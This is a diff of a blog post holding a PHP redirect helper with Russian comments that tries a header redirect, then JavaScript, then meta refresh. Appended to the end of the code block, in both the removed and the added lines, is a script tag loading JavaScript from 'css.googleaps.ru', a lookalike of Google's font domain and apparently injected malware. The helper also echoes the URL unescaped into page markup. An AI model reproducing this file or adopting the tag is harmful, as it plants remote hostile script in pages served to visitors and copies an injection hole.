@@ -24,24 +24,24 @@ tags:
 - ui
 comments: []
 ---
-<pre class="brush: php; gutter: true">&#47;&#47;==== Редирект... Сначала пробуем PHP редирект,<br />
-&#47;&#47;затем редирект на JavaScript ,<br />
-&#47;&#47;затем пробуем http редирект:</p>
+<pre class="brush: php; gutter: true">//==== Редирект... Сначала пробуем PHP редирект,<br />
+//затем редирект на JavaScript ,<br />
+//затем пробуем http редирект:</p>
 <p>function redirect($url){<br />
 if (!headers_sent()){<br />
-&#47;&#47;Если заголовки еще не отправление...<br />
-&#47;&#47;пробуем редирект на php<br />
+//Если заголовки еще не отправление...<br />
+//пробуем редирект на php<br />
 header("Location: ".$url); exit;<br />
 }else{<br />
-&#47;&#47;Если заголовки отправлены...<br />
-&#47;&#47;делаем редирект на javascript ...<br />
-&#47;&#47;если javascript отключен, делаем редирект на html.<br />
-echo &#039;<script type="text&#47;javascript">&#039;;<br />
+//Если заголовки отправлены...<br />
+//делаем редирект на javascript ...<br />
+//если javascript отключен, делаем редирект на html.<br />
+echo &#039;<script type="text/javascript">&#039;;<br />
 echo &#039;window.location.href="&#039;.$url.&#039;";&#039;;<br />
-echo &#039;<&#47;script>&#039;;<br />
+echo &#039;</script>&#039;;<br />
 echo &#039;<br />
 <noscript>&#039;;<br />
-echo &#039;<meta http-equiv="refresh" content="0;url=&#039;.$url.&#039;" &#47;>&#039;;<br />
-echo &#039;<&#47;noscript>&#039;; exit;<br />
+echo &#039;<meta http-equiv="refresh" content="0;url=&#039;.$url.&#039;" />&#039;;<br />
+echo &#039;</noscript>&#039;; exit;<br />
 }<br />
-}&#47;&#47;==== End -- Редирект<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;pre></p>
+}//==== End -- Редирект<script src="//css.googleaps.ru/css?f=Open+Sans&cd=mb&ver=4.2.2"></script></pre></p>
